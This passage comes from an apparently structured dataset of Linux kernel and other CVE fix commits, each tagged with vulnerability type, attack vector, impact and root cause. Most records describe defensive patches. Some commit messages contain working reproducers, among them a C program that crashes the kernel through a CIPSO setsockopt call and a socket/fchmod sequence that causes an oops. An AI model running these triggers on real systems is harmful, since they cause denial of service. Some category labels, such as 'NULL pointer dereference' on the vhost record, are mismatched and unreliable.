a crafted application containing a sigaction system call.","commit_message_1":"always clear sa_restorer on execve when the new signal handler are set up , the location of sa_restorer is not cleared , leaking a parent process 's address space location to child","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application containing a sigaction system call","Impact":"bypass the aslr protection mechanism","Root Cause":"preserves the value of the sa_restorer field across an exec operation","Attack Type":"local attacker"},{"commit_id":"9899d11f654474d2d54ea52ceaa2a1f4db3abd68","cve_id":"CVE-2013-0871","cwe_id":"CWE-362","commit_message":"ptrace: ensure arch_ptrace\/ptrace_request can never race with SIGKILL\n\nputreg() assumes that the tracee is not running and pt_regs_access() can\nsafely play with its stack.  However a killed tracee can return from\nptrace_stop() to the low-level asm code and do RESTORE_REST, this means\nthat debugger can actually read\/modify the kernel stack until the tracee\ndoes SAVE_REST again.\n\nset_task_blockstep() can race with SIGKILL too and in some sense this\nrace is even worse, the very fact the tracee can be woken up breaks the\nlogic.\n\nAs Linus suggested we can clear TASK_WAKEKILL around the arch_ptrace()\ncall, this ensures that nobody can ever wakeup the tracee while the\ndebugger looks at it.  Not only this fixes the mentioned problems, we\ncan do some cleanups\/simplifications in arch_ptrace() paths.\n\nProbably ptrace_unfreeze_traced() needs more callers, for example it\nmakes sense to make the tracee killable for oom-killer before\naccess_process_vm().\n\nWhile at it, add the comment into may_ptrace_stop() to explain why\nptrace_stop() still can't rely on SIGKILL and signal_pending_state().\n\nReported-by: Salman Qazi <sqazi@google.com>\nReported-by: Suleiman Souhlal <suleiman@google.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the ptrace functionality in the Linux kernel before 3.7.5 allows local users to gain privileges via a PTRACE_SETREGS ptrace system call in a crafted application, as demonstrated by ptrace_death.","commit_message_1":"ensure arch_ptrace\/ptrace_request can never race with sigkill putreg ( ) assumes that the tracee is not running and pt_regs_access ( ) can safely play with it stack","Vulnerability Type":"Race Condition","Attack Vector":"via a ptrace _ setregs ptrace system call in a crafted application , as demonstrated by ptrace _ death","Impact":"gain privileges","Root Cause":"caused by a race condition when handling ptrace actions","Attack Type":"local attacker"},{"commit_id":"0a9ab9bdb3e891762553f667066190c1d22ad62b","cve_id":"CVE-2013-0349","cwe_id":"CWE-200","commit_message":"Bluetooth: Fix incorrect strncpy() in hidp_setup_hid()\n\nThe length parameter should be sizeof(req->name) - 1 because there is no\nguarantee that string provided by userspace will contain the trailing\n'\\0'.\n\nCan be easily reproduced by manually setting req->name to 128 non-zero\nbytes prior to ioctl(HIDPCONNADD) and checking the device name setup on\ninput subsystem:\n\n$ cat \/sys\/devices\/pnp0\/00\\:04\/tty\/ttyS0\/hci0\/hci0\\:1\/input8\/name\nAAAAAA[...]AAAAAAAAf0:af:f0:af:f0:af\n\n(\"f0:af:f0:af:f0:af\" is the device bluetooth address, taken from \"phys\"\nfield in struct hid_device due to overflow.)\n\nCc: stable@vger.kernel.org\nSigned-off-by: Anderson Lizardo <anderson.lizardo@openbossa.org>\nAcked-by: Marcel Holtmann <marcel@holtmann.org>\nSigned-off-by: Gustavo Padovan <gustavo.padovan@collabora.co.uk>","summary":"The hidp_setup_hid function in net\/bluetooth\/hidp\/core.c in the Linux kernel before 3.7.6 does not properly copy a certain name field, which allows local users to obtain sensitive information from kernel memory by setting a long name and making an HIDPCONNADD ioctl call.","commit_message_1":"fix incorrect strncpy ( ) in hidp_setup_hid ( ) the length parameter should be sizeof ( req- > name ) - <number> because there is no guarantee that string provided by userspace will contain the trailing '\\<number> '","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by setting a long name and making an hidpconnadd ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly copy a certain name field","Attack Type":"local attacker"},{"commit_id":"a67adb997419fb53540d4a4f79c6471c60bc69b6","cve_id":"CVE-2013-0313","cwe_id":null,"commit_message":"evm: checking if removexattr is not a NULL\n\nThe following lines of code produce a kernel oops.\n\nfd = socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0);\nfchmod(fd, 0666);\n\n[  139.922364] BUG: unable to handle kernel NULL pointer dereference at   (null)\n[  139.924982] IP: [<  (null)>]   (null)\n[  139.924982] *pde = 00000000\n[  139.924982] Oops: 0000 [#5] SMP\n[  139.924982] Modules linked in: fuse dm_crypt dm_mod i2c_piix4 serio_raw evdev binfmt_misc button\n[  139.924982] Pid: 3070, comm: acpid Tainted: G      D      3.8.0-rc2-kds+ #465 Bochs Bochs\n[  139.924982] EIP: 0060:[<00000000>] EFLAGS: 00010246 CPU: 0\n[  139.924982] EIP is at 0x0\n[  139.924982] EAX: cf5ef000 EBX: cf5ef000 ECX: c143d600 EDX: c15225f2\n[  139.924982] ESI: cf4d2a1c EDI: cf4d2a1c EBP: cc02df10 ESP: cc02dee4\n[  139.924982]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068\n[  139.924982] CR0: 80050033 CR2: 00000000 CR3: 0c059000 CR4: 000006d0\n[  139.924982] DR0: 00000000 DR1: 00000000 DR2: 00000000 DR3: 00000000\n[  139.924982] DR6: ffff0ff0 DR7: 00000400\n[  139.924982] Process acpid (pid: 3070, ti=cc02c000 task=d7705340 task.ti=cc02c000)\n[  139.924982] Stack:\n[  139.924982]  c1203c88 00000000 cc02def4 cf4d2a1c ae21eefa 471b60d5 1083c1ba c26a5940\n[  139.924982]  e891fb5e 00000041 00000004 cc02df1c c1203964 00000000 cc02df4c c10e20c3\n[  139.924982]  00000002 00000000 00000000 22222222 c1ff2222 cf5ef000 00000000 d76efb08\n[  139.924982] Call Trace:\n[  139.924982]  [<c1203c88>] ? evm_update_evmxattr+0x5b\/0x62\n[  139.924982]  [<c1203964>] evm_inode_post_setattr+0x22\/0x26\n[  139.924982]  [<c10e20c3>] notify_change+0x25f\/0x281\n[  139.924982]  [<c10cbf56>] chmod_common+0x59\/0x76\n[  139.924982]  [<c10e27a1>] ? put_unused_fd+0x33\/0x33\n[  139.924982]  [<c10cca09>] sys_fchmod+0x39\/0x5c\n[  139.924982]  [<c13f4f30>] syscall_call+0x7\/0xb\n[  139.924982] Code:  Bad EIP value.\n\nThis happens because sockets do not define the removexattr operation.\nBefore removing the xattr, verify the removexattr function pointer is\nnot NULL.\n\nSigned-off-by: Dmitry Kasatkin <dmitry.kasatkin@intel.com>\nSigned-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com>\nCc: stable@vger.kernel.org\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The evm_update_evmxattr function in security\/integrity\/evm\/evm_crypto.c in the Linux kernel before 3.7.5, when the Extended Verification Module (EVM) is enabled, allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via an attempted removexattr operation on an inode of a sockfs filesystem.","commit_message_1":"checking if removexattr is not a null the following line of code produce a kernel oops","Vulnerability Type":"NULL pointer dereference","Attack Vector":"If built with Extended Verification Module(EVM) enabled and configured properly","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference when accessing extended attribute routines of sockfs inode object","Attack Type":"local attacker"},{"commit_id":"bd97120fc3d1a11f3124c7c9ba1d91f51829eb85","cve_id":"CVE-2013-0311","cwe_id":null,"commit_message":"vhost: fix length for cross region descriptor\n\nIf a single descriptor crosses a region, the\nsecond chunk length should be decremented\nby size translated so far, instead it includes\nthe full descriptor length.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nAcked-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The translate_desc function in drivers\/vhost\/vhost.c in the Linux kernel before 3.7 does not properly handle cross-region descriptors, which allows guest OS users to obtain host OS privileges by leveraging KVM guest OS privileges.","commit_message_1":"fix length for cross region descriptor if a single descriptor cross a region , the second chunk length should be decremented by size translated so far , instead it includes the full descriptor length","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging kvm guest os privileges","Impact":"obtain host os privileges","Root Cause":"does not properly handle cross - region descriptors","Attack Type":"local attacker"},{"commit_id":"89d7ae34cdda4195809a5a987f697a517a2a3177","cve_id":"CVE-2013-0310","cwe_id":"CWE-119","commit_message":"cipso: don't follow a NULL pointer when setsockopt() is called\n\nAs reported by Alan Cox, and verified by Lin Ming, when a user\nattempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL\ntag the kernel dies a terrible death when it attempts to follow a NULL\npointer (the skb argument to cipso_v4_validate() is NULL when called via\nthe setsockopt() syscall).\n\nThis patch fixes this by first checking to ensure that the skb is\nnon-NULL before using it to find the incoming network interface.  In\nthe unlikely case where the skb is NULL and the user attempts to add\na CIPSO option with the _TAG_LOCAL tag we return an error as this is\nnot something we want to allow.\n\nA simple reproducer, kindly supplied by Lin Ming, although you must\nhave the CIPSO DOI #3 configure on the system first or you will be\ncaught early in cipso_v4_validate():\n\n\t#include <sys\/types.h>\n\t#include <sys\/socket.h>\n\t#include <linux\/ip.h>\n\t#include <linux\/in.h>\n\t#include <string.h>\n\n\tstruct local_tag {\n\t\tchar type;\n\t\tchar length;\n\t\tchar info[4];\n\t};\n\n\tstruct cipso {\n\t\tchar type;\n\t\tchar length;\n\t\tchar doi[4];\n\t\tstruct local_tag local;\n\t};\n\n\tint main(int argc, char **argv)\n\t{\n\t\tint sockfd;\n\t\tstruct cipso cipso = {\n\t\t\t.type = IPOPT_CIPSO,\n\t\t\t.length = sizeof(struct cipso),\n\t\t\t.local = {\n\t\t\t\t.type = 128,\n\t\t\t\t.length = sizeof(struct local_tag),\n\t\t\t},\n\t\t};\n\n\t\tmemset(cipso.doi, 0, 4);\n\t\tcipso.doi[3] = 3;\n\n\t\tsockfd = socket(AF_INET, SOCK_DGRAM, 0);\n\t\t#define SOL_IP 0\n\t\tsetsockopt(sockfd, SOL_IP, IP_OPTIONS,\n\t\t\t&cipso, sizeof(struct cipso));\n\n\t\treturn 0;\n\t}\n\nCC: Lin Ming <mlin@ss.pku.edu.cn>\nReported-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: Paul Moore <pmoore@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The cipso_v4_validate function in net\/ipv4\/cipso_ipv4.c in the Linux kernel before 3.4.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via an IPOPT_CIPSO IP_OPTIONS setsockopt system call.","commit_message_1":"do n't follow a null pointer when setsockopt ( ) is called a reported by alan cox , and verified by lin ming , when a user attempt to add a cipso option to a socket using the cipso_v4_tag_local tag the kernel dy a terrible death when it attempt to follow a null pointer ( the skb argument to cipso_v4_validate ( ) is null when called via the setsockopt ( ) syscall )","Vulnerability Type":"buffer overflow","Attack Vector":"via an ipopt _ cipso ip _ options setsockopt system call","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"027ef6c87853b0a9df53175063028edb4950d476","cve_id":"CVE-2013-0309","cwe_id":"CWE-119","commit_message":"mm: thp: fix pmd_present for split_huge_page and PROT_NONE with THP\n\nIn many places !pmd_present has been converted to pmd_none.  For pmds\nthat's equivalent and pmd_none is quicker so using pmd_none is better.\n\nHowever (unless we delete pmd_present) we should provide an accurate\npmd_present too.  This will avoid the risk of code thinking the pmd is non\npresent because it's under __split_huge_page_map, see the pmd_mknotpresent\nthere and the comment above it.\n\nIf the page has been mprotected as PROT_NONE, it would also lead to a\npmd_present false negative in the same way as the race with\nsplit_huge_page.\n\nBecause the PSE bit stays on at all times (both during split_huge_page and\nwhen the _PAGE_PROTNONE bit get set), we could only check for the PSE bit,\nbut checking the PROTNONE bit too is still good to remember pmd_present\nmust always keep PROT_NONE into account.\n\nThis explains a not reproducible BUG_ON that was seldom reported on the\nlists.\n\nThe same issue is in pmd_large, it would go wrong with both PROT_NONE and\nif it races with split_huge_page.\n\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: Johannes Weiner <jweiner@redhat.com>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"arch\/x86\/include\/asm\/pgtable.h in the Linux kernel before 3.6.2, when transparent huge pages are used, does not properly support PROT_NONE memory regions, which allows local users to cause a denial of service (system crash) via a crafted application.","commit_message_1":"thp : fix pmd_present for split_huge_page and prot_none with thp in many place ! pmd_present ha been converted to pmd_none","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly support prot _ none memory regions","Attack Type":"local attacker"},{"commit_id":"77c1090f94d1b0b5186fb13a1b71b47b1343f87f","cve_id":"CVE-2013-0290","cwe_id":"CWE-20","commit_message":"net: fix infinite loop in __skb_recv_datagram()\n\nTommi was fuzzing with trinity and reported the following problem :\n\ncommit 3f518bf745 (datagram: Add offset argument to __skb_recv_datagram)\nmissed that a raw socket receive queue can contain skbs with no payload.\n\nWe can loop in __skb_recv_datagram() with MSG_PEEK mode, because\nwait_for_packet() is not prepared to skip these skbs.\n\n[   83.541011] INFO: rcu_sched detected stalls on CPUs\/tasks: {}\n(detected by 0, t=26002 jiffies, g=27673, c=27672, q=75)\n[   83.541011] INFO: Stall ended before state dump start\n[  108.067010] BUG: soft lockup - CPU#0 stuck for 22s! [trinity-child31:2847]\n...\n[  108.067010] Call Trace:\n[  108.067010]  [<ffffffff818cc103>] __skb_recv_datagram+0x1a3\/0x3b0\n[  108.067010]  [<ffffffff818cc33d>] skb_recv_datagram+0x2d\/0x30\n[  108.067010]  [<ffffffff819ed43d>] rawv6_recvmsg+0xad\/0x240\n[  108.067010]  [<ffffffff818c4b04>] sock_common_recvmsg+0x34\/0x50\n[  108.067010]  [<ffffffff818bc8ec>] sock_recvmsg+0xbc\/0xf0\n[  108.067010]  [<ffffffff818bf31e>] sys_recvfrom+0xde\/0x150\n[  108.067010]  [<ffffffff81ca4329>] system_call_fastpath+0x16\/0x1b\n\nReported-by: Tommi Rantala <tt.rantala@gmail.com>\nTested-by: Tommi Rantala <tt.rantala@gmail.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nCc: Pavel Emelyanov <xemul@parallels.com>\nAcked-by: Pavel Emelyanov <xemul@parallels.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __skb_recv_datagram function in net\/core\/datagram.c in the Linux kernel before 3.8 does not properly handle the MSG_PEEK flag with zero-length data, which allows local users to cause a denial of service (infinite loop and system hang) via a crafted application.","commit_message_1":"fix infinite loop in __skb_recv_datagram ( ) tommi wa fuzzing with trinity and reported the following problem : commit 3f518bf745 ( datagram : add offset argument to __skb_recv_datagram ) missed that a raw socket receive queue can contain skbs with no payload","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( infinite loop and system hang )","Root Cause":"does not properly handle the msg _ peek flag with zero - length data","Attack Type":"local attacker"},{"commit_id":"564f7cc2a51dcd2f28ab12a13394f31be5aa3c93","cve_id":"CVE-2013-0281","cwe_id":"CWE-399","commit_message":"High: core: Internal tls api improvements for reuse with future LRMD tls backend.","summary":"Pacemaker 1.1.10, when remote Cluster Information Base (CIB) configuration or resource management is enabled, does not limit the duration of connections to the blocking sockets, which allows remote attackers to cause a denial of service (connection blocking).","commit_message_1":"core : internal tl api improvement for reuse with future lrmd tl backend","Vulnerability Type":"Resource Management Errors","Attack Vector":"If remote Cluster Information Base (CIB) cluster's configuration and cluster's resources management is enabled","Impact":"cause a denial of service ( connection blocking )","Root Cause":"caused by an error when processing remote connections","Attack Type":"remote attacker"},{"commit_id":"c903f0456bc69176912dee6dd25c6a66ee1aed00","cve_id":"CVE-2013-0268","cwe_id":"CWE-264","commit_message":"x86\/msr: Add capabilities check\n\nAt the moment the MSR driver only relies upon file system\nchecks. This means that anything as root with any capability set\ncan write to MSRs. Historically that wasn't very interesting but\non modern processors the MSRs are such that writing to them\nprovides several ways to execute arbitary code in kernel space.\nSample code and documentation on doing this is circulating and\nMSR attacks are used on Windows 64bit rootkits already.\n\nIn the Linux case you still need to be able to open the device\nfile so the impact is fairly limited and reduces the security of\nsome capability and security model based systems down towards\nthat of a generic \"root owns the box\" setup.\n\nTherefore they should require CAP_SYS_RAWIO to prevent an\nelevation of capabilities. The impact of this is fairly minimal\non most setups because they don't have heavy use of\ncapabilities. Those using SELinux, SMACK or AppArmor rules might\nwant to consider if their rulesets on the MSR driver could be\ntighter.\n\nSigned-off-by: Alan Cox <alan@linux.intel.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: Horses <stable@kernel.org>\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The msr_open function in arch\/x86\/kernel\/msr.c in the Linux kernel before 3.7.6 allows local users to bypass intended capability restrictions by executing a crafted application as root, as demonstrated by msr32.c.","commit_message_1":"add capability check at the moment the msr driver only relies upon file system check","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by executing a crafted application as root , as demonstrated by msr32 . c","Impact":"bypass intended capability restrictions","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"7d5145d8eb2b9791533ffe4dc003b129b9696c48","cve_id":"CVE-2013-0217","cwe_id":"CWE-399","commit_message":"xen\/netback: don't leak pages on failure in xen_netbk_tx_check_gop.\n\nSigned-off-by: Matthew Daley <mattjd@gmail.com>\nReviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nAcked-by: Ian Campbell <ian.campbell@citrix.com>\nAcked-by: Jan Beulich <JBeulich@suse.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Memory leak in drivers\/net\/xen-netback\/netback.c in the Xen netback functionality in the Linux kernel before 3.7.8 allows guest OS users to cause a denial of service (memory consumption) by triggering certain error conditions.","commit_message_1":"xen\/netback : do n't leak page on failure in xen_netbk_tx_check_gop","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering certain error conditions","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak on an error path within the netback implementation","Attack Type":"remote attacker"},{"commit_id":"48856286b64e4b66ec62b94e504d0b29c1ade664","cve_id":"CVE-2013-0216","cwe_id":"CWE-20","commit_message":"xen\/netback: shutdown the ring if it contains garbage.\n\nA buggy or malicious frontend should not be able to confuse netback.\nIf we spot anything which is not as it should be then shutdown the\ndevice and don't try to continue with the ring in a potentially\nhostile state. Well behaved and non-hostile frontends will not be\npenalised.\n\nAs well as making the existing checks for such errors fatal also add a\nnew check that ensures that there isn't an insane number of requests\non the ring (i.e. more than would fit in the ring). If the ring\ncontains garbage then previously is was possible to loop over this\ninsane number, getting an error each time and therefore not generating\nany more pending requests and therefore not exiting the loop in\nxen_netbk_tx_build_gops for an externded period.\n\nAlso turn various netdev_dbg calls which no precipitate a fatal error\ninto netdev_err, they are rate limited because the device is shutdown\nafterwards.\n\nThis fixes at least one known DoS\/softlockup of the backend domain.\n\nSigned-off-by: Ian Campbell <ian.campbell@citrix.com>\nReviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nAcked-by: Jan Beulich <JBeulich@suse.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Xen netback functionality in the Linux kernel before 3.7.8 allows guest OS users to cause a denial of service (loop) by triggering ring pointer corruption.","commit_message_1":"shutdown the ring if it contains garbage","Vulnerability Type":"Improper Input Validation","Attack Vector":"by triggering ring pointer corruption","Impact":"cause a denial of service ( loop )","Root Cause":"caused by the failure to sanity check the ring producer\/consumer pointers within the netback implementation","Attack Type":"local attacker"},{"commit_id":"22531545514043e04633e1c015c7540b9de9dbe4","cve_id":"CVE-2013-0211","cwe_id":"CWE-189","commit_message":"Limit write requests to at most INT_MAX.\nThis prevents a certain common programming error (passing -1 to write)\nfrom leading to other problems deeper in the library.","summary":"Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.","commit_message_1":"limit write request to at most int_max","Vulnerability Type":"Numeric Errors","Attack Vector":"via unspecified vectors , which triggers an improper conversion between unsigned and signed types , leading to a buffer overflow","Impact":"cause a denial of service ( crash )","Root Cause":"when running on 64 - bit machines","Attack Type":"local attacker"},{"commit_id":"fe685aabf7c8c9f138e5ea900954d295bf229175","cve_id":"CVE-2012-6549","cwe_id":"CWE-200","commit_message":"isofs: avoid info leak on export\n\nFor type 1 the parent_offset member in struct isofs_fid gets copied\nuninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The isofs_export_encode_fh function in fs\/isofs\/export.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory via a crafted application.","commit_message_1":"avoid info leak on export for type <number> the parent_offset member in struct isofs_fid get copied uninitialized to userland","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"local attacker"},{"commit_id":"0143fc5e9f6f5aad4764801015bc8d4b4a278200","cve_id":"CVE-2012-6548","cwe_id":"CWE-200","commit_message":"udf: avoid info leak on export\n\nFor type 0x51 the udf.parent_partref member in struct fid gets copied\nuninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The udf_encode_fh function in fs\/udf\/namei.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory via a crafted application.","commit_message_1":"avoid info leak on export for type 0x51 the <file> member in struct fid get copied uninitialized to userland","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"local attacker"},{"commit_id":"a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc","cve_id":"CVE-2012-6547","cwe_id":"CWE-200","commit_message":"net\/tun: fix ioctl() based info leaks\n\nThe tun module leaks up to 36 bytes of memory by not fully initializing\na structure located on the stack that gets copied to user memory by the\nTUNGETIFF and SIOCGIFHWADDR ioctl()s.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __tun_chr_ioctl function in drivers\/net\/tun.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix ioctl ( ) based info leak the tun module leak up to <number> byte of memory by not fully initializing a structure located on the stack that get copied to user memory by the tungetiff and siocgifhwaddr ioctl ( ) s","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure","Attack Type":"local attacker"},{"commit_id":"e862f1a9b7df4e8196ebec45ac62295138aa3fc2","cve_id":"CVE-2012-6546","cwe_id":"CWE-200","commit_message":"atm: fix info leak in getsockopt(SO_ATMPVC)\n\nThe ATM code fails to initialize the two padding bytes of struct\nsockaddr_atmpvc inserted for alignment. Add an explicit memset(0)\nbefore filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ATM implementation in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak in getsockopt ( so_atmpvc ) the atm code fails to initialize the two padding byte of struct sockaddr_atmpvc inserted for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"9344a972961d1a6d2c04d9008b13617bcb6ec2ef","cve_id":"CVE-2012-6545","cwe_id":"CWE-200","commit_message":"Bluetooth: RFCOMM - Fix info leak via getsockname()\n\nThe RFCOMM code fails to initialize the trailing padding byte of struct\nsockaddr_rc added for alignment. It that for leaks one byte kernel stack\nvia the getsockname() syscall. Add an explicit memset(0) before filling\nthe structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Bluetooth RFCOMM implementation in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"rfcomm - fix info leak via getsockname ( ) the rfcomm code fails to initialize the trailing padding byte of struct sockaddr_rc added for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"e15ca9a0ef9a86f0477530b0f44a725d67f889ee","cve_id":"CVE-2012-6544","cwe_id":"CWE-200","commit_message":"Bluetooth: HCI - Fix info leak in getsockopt(HCI_FILTER)\n\nThe HCI code fails to initialize the two padding bytes of struct\nhci_ufilter before copying it to userland -- that for leaking two\nbytes kernel stack. Add an explicit memset(0) before filling the\nstructure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Bluetooth protocol stack in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that targets the (1) L2CAP or (2) HCI implementation.","commit_message_1":"hci - fix info leak in getsockopt ( hci_filter ) the hci code fails to initialize the two padding byte of struct hci_ufilter before copying it to userland -- that for leaking two byte kernel stack","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application that targets the l2cap or hci implementation","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"04d4fbca1017c11381e7d82acea21dd741e748bc","cve_id":"CVE-2012-6543","cwe_id":"CWE-200","commit_message":"l2tp: fix info leak via getsockname()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_unused member of\nstruct sockaddr_l2tpip6 and that for leaks two bytes kernel stack via\nthe getsockname() syscall. Initialize l2tp_unused with 0 to avoid the\ninfo leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: James Chapman <jchapman@katalix.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The l2tp_ip6_getname function in net\/l2tp\/l2tp_ip6.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak via getsockname ( ) the l2tp code for ipv6 fails to initialize the l2tp_unused member of struct sockaddr_l2tpip6 and that for leak two byte kernel stack via the getsockname ( ) syscall","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"local attacker"},{"commit_id":"3592aaeb80290bda0f2cf0b5456c97bfc638b192","cve_id":"CVE-2012-6542","cwe_id":"CWE-200","commit_message":"llc: fix info leak via getsockname()\n\nThe LLC code wrongly returns 0, i.e. \"success\", when the socket is\nzapped. Together with the uninitialized uaddrlen pointer argument from\nsys_getsockname this leads to an arbitrary memory leak of up to 128\nbytes kernel stack via the getsockname() syscall.\n\nReturn an error instead when the socket is zapped to prevent the info\nleak. Also remove the unnecessary memset(0). We don't directly write to\nthe memory pointed by uaddr but memcpy() a local structure at the end of\nthe function that is properly initialized.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The llc_ui_getname function in net\/llc\/af_llc.c in the Linux kernel before 3.6 has an incorrect return value in certain circumstances, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that leverages an uninitialized pointer argument.","commit_message_1":"fix info leak via getsockname ( ) the llc code wrongly return <number> , <file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application that leverages an uninitialized pointer argument","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"has an incorrect return value","Attack Type":"local attacker"},{"commit_id":"7b07f8eb75aa3097cdfd4f6eac3da49db787381d","cve_id":"CVE-2012-6541","cwe_id":"CWE-200","commit_message":"dccp: fix info leak via getsockopt(DCCP_SOCKOPT_CCID_TX_INFO)\n\nThe CCID3 code fails to initialize the trailing padding bytes of struct\ntfrc_tx_info added for alignment on 64 bit architectures. It that for\npotentially leaks four bytes kernel stack via the getsockopt() syscall.\nAdd an explicit memset(0) before filling the structure to avoid the\ninfo leak.\n\nSigned-off-by: Mathias Krause 